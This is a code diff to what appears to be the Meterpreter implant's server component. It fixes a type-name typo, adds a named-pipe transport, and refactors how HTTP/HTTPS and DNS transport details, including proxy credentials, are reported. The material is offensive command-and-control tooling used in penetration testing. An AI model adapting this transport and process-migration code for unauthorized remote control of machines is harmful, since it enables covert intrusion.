@@ -4,14 +4,14 @@
 
 DWORD get_migrate_context(LPDWORD contextSize, LPCOMMONMIGRATECONTEXT* contextBuffer)
 {
-	*contextBuffer = (LPCOMMONMIGRATECONTEXT)calloc(1, sizeof(COMMONMIGRATCONTEXT));
+	*contextBuffer = (LPCOMMONMIGRATECONTEXT)calloc(1, sizeof(COMMONMIGRATECONTEXT));
 
 	if (*contextBuffer == NULL)
 	{
 		return ERROR_OUTOFMEMORY;
 	}
 
-	*contextSize = sizeof(COMMONMIGRATCONTEXT);
+	*contextSize = sizeof(COMMONMIGRATECONTEXT);
 
 	return ERROR_SUCCESS;
 }
@@ -65,6 +65,15 @@ DWORD create_transport_from_request(Remote* remote, Packet* packet, Transport** 
 		if (wcsncmp(transportUrl, L"tcp", 3) == 0)
 		{
 			MetsrvTransportTcp config = { 0 };
+			config.common.comms_timeout = timeouts.comms;
+			config.common.retry_total = timeouts.retry_total;
+			config.common.retry_wait = timeouts.retry_wait;
+			memcpy(config.common.url, transportUrl, sizeof(config.common.url));
+			transport = remote->trans_create(remote, &config.common, NULL);
+		}
+		else if (wcsncmp(transportUrl, L"pipe", 4) == 0)
+		{
+			MetsrvTransportNamedPipe config = { 0 };
 			config.common.comms_timeout = timeouts.comms;
 			config.common.retry_total = timeouts.retry_total;
 			config.common.retry_wait = timeouts.retry_wait;
@@ -168,31 +177,37 @@ DWORD remote_request_core_transport_list(Remote* remote, Packet* packet)
 			dprintf("[DISPATCH] Adding Retry wait %u", current->timeouts.retry_wait);
 			packet_add_tlv_uint(transportGroup, TLV_TYPE_TRANS_RETRY_WAIT, current->timeouts.retry_wait);
 
-			if (current->type != METERPRETER_TRANSPORT_SSL && current->type != METERPRETER_TRANSPORT_DNS)
+			switch (current->type)
 			{
-				HttpTransportContext* ctx = (HttpTransportContext*)current->ctx;
-				dprintf("[DISPATCH] Transport is HTTP/S");
-				if (ctx->ua)
+				case METERPRETER_TRANSPORT_HTTP:
+				case METERPRETER_TRANSPORT_HTTPS:
 				{
-					packet_add_tlv_wstring(transportGroup, TLV_TYPE_TRANS_UA, ctx->ua);
+					HttpTransportContext* ctx = (HttpTransportContext*)current->ctx;
+					dprintf("[DISPATCH] Transport is HTTP/S");
+					if (ctx->ua)
+					{
+						packet_add_tlv_wstring(transportGroup, TLV_TYPE_TRANS_UA, ctx->ua);
+					}
+					if (ctx->proxy)
+					{
+						packet_add_tlv_wstring(transportGroup, TLV_TYPE_TRANS_PROXY_HOST, ctx->proxy);
+					}
+					if (ctx->proxy_user)
+					{
+						packet_add_tlv_wstring(transportGroup, TLV_TYPE_TRANS_PROXY_USER, ctx->proxy_user);
+					}
+					if (ctx->proxy_pass)
+					{
+						packet_add_tlv_wstring(transportGroup, TLV_TYPE_TRANS_PROXY_PASS, ctx->proxy_pass);
+					}
+					if (ctx->cert_hash)
+					{
+						packet_add_tlv_raw(transportGroup, TLV_TYPE_TRANS_CERT_HASH, ctx->cert_hash, CERT_HASH_SIZE);
+					}
+					break;
 				}
-				if (ctx->proxy)
-				{
-					packet_add_tlv_wstring(transportGroup, TLV_TYPE_TRANS_PROXY_HOST, ctx->proxy);
-				}
-				if (ctx->proxy_user)
-				{
-					packet_add_tlv_wstring(transportGroup, TLV_TYPE_TRANS_PROXY_USER, ctx->proxy_user);
-				}
-				if (ctx->proxy_pass)
-				{
-					packet_add_tlv_wstring(transportGroup, TLV_TYPE_TRANS_PROXY_PASS, ctx->proxy_pass);
-				}
-				if (ctx->cert_hash)
-				{
-					packet_add_tlv_raw(transportGroup, TLV_TYPE_TRANS_CERT_HASH, ctx->cert_hash, CERT_HASH_SIZE);
-				}
-			} else if (current->type == METERPRETER_TRANSPORT_DNS){
+			case METERPRETER_TRANSPORT_DNS:
+            {
                 DnsTransportContext* ctx = (DnsTransportContext*)current->ctx;
 				dprintf("[DISPATCH] Transport is DNS");
                 if (ctx->ns_server)
@@ -207,6 +222,7 @@ DWORD remote_request_core_transport_list(Remote* remote, Packet* packet)
 				{
                     packet_add_tlv_wstring(transportGroup, TLV_TYPE_TRANS_SERVER_ID, ctx->server_id);
                 }
+				break;
             }
 
 			packet_add_group(response, TLV_TYPE_TRANS_GROUP, transportGroup);
@@ -584,7 +600,7 @@ BOOL remote_request_core_migrate(Remote * remote, Packet * packet, DWORD* pResul
 			break;
 		}
 
-		// Create a notification event that we'll use to know when it's safe to exit 
+		// Create a notification event that we'll use to know when it's safe to exit
 		// (once the socket has been referenced in the other process)
 		hEvent = CreateEvent(NULL, TRUE, FALSE, NULL);
 		if (!hEvent)
